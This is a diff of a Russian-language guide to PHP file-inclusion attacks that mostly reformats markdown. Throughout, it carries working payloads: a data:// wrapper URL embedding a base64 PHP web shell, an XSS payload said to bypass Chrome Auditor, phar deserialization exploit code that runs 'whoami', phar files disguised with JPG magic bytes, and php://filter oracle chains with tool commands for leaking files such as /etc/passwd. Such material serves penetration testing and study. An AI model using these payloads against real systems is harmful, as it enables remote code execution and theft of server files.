@@ -73,7 +73,7 @@ curl "127.0.0.1:8000/index.php?0=id&file=php://filter/convert.iconv.UTF8.CSISO20
 http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
 ```
 
-Забавный факт: можно вызвать XSS и обойти Chrome Auditor с помощью: http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
+Забавный факт: можно вызвать XSS и обойти Chrome Auditor с помощью: ```http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+```
 
 # Wrapper expect://
 
@@ -133,7 +133,7 @@ http://example.com/index.php?page=zip://shell.jpg%23payload.php
   $phar->stopBuffering();
 ?>
 ```
-* Используйте wrapper phar://: curl http://127.0.0.1:8001/?page=phar:///var/www/html/archive.phar/test.txt
+* Используйте wrapper ```phar://: curl http://127.0.0.1:8001/?page=phar:///var/www/html/archive.phar/test.txt```
 
 ## Десериализация PHAR
 
@@ -142,8 +142,8 @@ http://example.com/index.php?page=zip://shell.jpg%23payload.php
 Если операция с файлом выполняется на нашем существующем phar-файле через wrapper phar://, то его сериализованные метаданные десериализуются. Эта уязвимость возникает в следующих функциях, включая file_exists: include, file_get_contents, file_put_contents, copy, file_exists, is_executable, is_file, is_dir, is_link, is_writable, fileperms, fileinode, filesize, fileowner, filegroup, fileatime, filemtime, filectime, filetype, getimagesize, exif_read_data, stat, lstat, touch, md5_file, и т.д.
 
 Для этого эксплойта требуется хотя бы один класс с магическими методами, такими как __destruct() или __wakeup(). Возьмем в качестве примера этот класс AnyClass, который выполняет параметр data.
-php
 
+```php
 class AnyClass {
     public $data = null;
     public function __construct($data) {
@@ -157,10 +157,11 @@ class AnyClass {
 
 ...
 echo file_exists($_GET['page']);
+```
 
-Мы можем создать phar-архив, содержащий сериализованный объект в своих метаданных.
-php
+* Мы можем создать phar-архив, содержащий сериализованный объект в своих метаданных.
 
+```php
 // создаем новый Phar
 $phar = new Phar('deser.phar');
 $phar->startBuffering();
@@ -181,41 +182,38 @@ class AnyClass {
 $object = new AnyClass('whoami');
 $phar->setMetadata($object);
 $phar->stopBuffering();
+```
 
-Наконец, вызовите wrapper phar: curl http://127.0.0.1:8001/?page=phar:///var/www/html/deser.phar
+Наконец, вызовите wrapper ```phar: curl http://127.0.0.1:8001/?page=phar:///var/www/html/deser.phar```
 
-ПРИМЕЧАНИЕ: вы можете использовать $phar->setStub(), чтобы добавить магические байты JPG файла: \xff\xd8\xff
-php
+ПРИМЕЧАНИЕ: вы можете использовать ```$phar->setStub()```, чтобы добавить магические байты JPG файла: ```\xff\xd8\xff```
 
+```php
 $phar->setStub("\xff\xd8\xff\n<?php __HALT_COMPILER(); ?>");
+```
 
 # Wrapper convert.iconv:// и dechunk://
 
-Утечка содержимого файла через оракул на основе ошибок
+### Утечка содержимого файла через оракул на основе ошибок
 
-    convert.iconv://: преобразует ввод в другую кодировку (convert.iconv.utf-16le.utf-8)
+```convert.iconv://```: преобразует ввод в другую кодировку (convert.iconv.utf-16le.utf-8)
+```dechunk://```: если строка не содержит символов новой строки, она полностью очистит строку, если и только если строка начинается с A-Fa-f0-9
 
-    dechunk://: если строка не содержит символов новой строки, она полностью очистит строку, если и только если строка начинается с A-Fa-f0-9
-
-Цель этой эксплуатации - утечка содержимого файла по одному символу за раз, на основе writeup от DownUnderCTF.
+Цель этой эксплуатации - утечка содержимого файла по одному символу за раз, на основе writeup от [DownUnderCTF](https://github.com/DownUnderCTF/Challenges_2022_Public/blob/main/web/minimal-php/solve/solution.py).
 
 Требования:
 
-    Бэкенд не должен использовать file_exists или is_file.
-
-    Уязвимый параметр должен быть в POST-запросе.
-
-        Вы не можете утечь более 135 символов в GET-запросе из-за ограничения по размеру.
+* Бэкенд не должен использовать file_exists или is_file.
+* Уязвимый параметр должен быть в POST-запросе.
+      * Из-за ограничения по размеру эксфильтрация ограничена не более 135 символами в GET-запросе. 
 
 Цепочка эксплойта основана на PHP фильтрах: iconv и dechunk:
 
-    Используйте фильтр iconv с кодировкой, экспоненциально увеличивающей размер данных, чтобы вызвать ошибку памяти.
+1. Используйте фильтр ```iconv``` с кодировкой, экспоненциально увеличивающей размер данных, чтобы вызвать ошибку памяти.
+2. Используйте фильтр ```dechunk```, чтобы определить первый символ файла, на основе предыдущей ошибки.
+3. Снова используйте фильтр ```iconv``` с кодировками, имеющими разный порядок байтов, чтобы поменять местами оставшиеся символы с первым.
 
-    Используйте фильтр dechunk, чтобы определить первый символ файла, на основе предыдущей ошибки.
-
-    Снова используйте фильтр iconv с кодировками, имеющими разный порядок байтов, чтобы поменять местами оставшиеся символы с первым.
-
-Эксплойт с использованием synacktiv/php_filter_chains_oracle_exploit, скрипт будет использовать либо код состояния HTTP: 500, либо время в качестве оракула на основе ошибок для определения символа.
+Эксплойт с использованием [synacktiv/php_filter_chains_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit), скрипт будет использовать либо код состояния HTTP: 500, либо время в качестве оракула на основе ошибок для определения символа.
 
 ```bash
 $ python3 filters_chain_oracle_exploit.py --target http://127.0.0.1 --file '/test' --parameter 0
@@ -227,7 +225,7 @@ $ python3 filters_chain_oracle_exploit.py --target http://127.0.0.1 --file '/tes
 
 ## Утечка содержимого файла внутри пользовательского формата вывода
 
-    ambionics/wrapwrap - Генерирует цепочку php://filter, которая добавляет префикс и суффикс к содержимому файла.
+[ambionics/wrapwrap](https://github.com/ambionics/wrapwrap) - Генерирует цепочку php://filter, которая добавляет префикс и суффикс к содержимому файла.
 
 Чтобы получить содержимое некоторого файла, мы хотели бы иметь: {"message":"<содержимое файла>"}.
 
@@ -249,12 +247,11 @@ $ python3 filters_chain_oracle_exploit.py --target http://127.0.0.1 --file '/tes
 
 ## Утечка содержимого файла с использованием примитива слепого чтения файлов
 
-    ambionics/lightyear
+* [ambionics/lightyear](https://github.com/ambionics/lightyear)
 
-bash
-
+```bash
 code remote.py # отредактируйте Remote.oracle
 ./lightyear.py test # проверьте, что ваша реализация работает
 ./lightyear.py /etc/passwd # сдампите файл!
-
+```
 
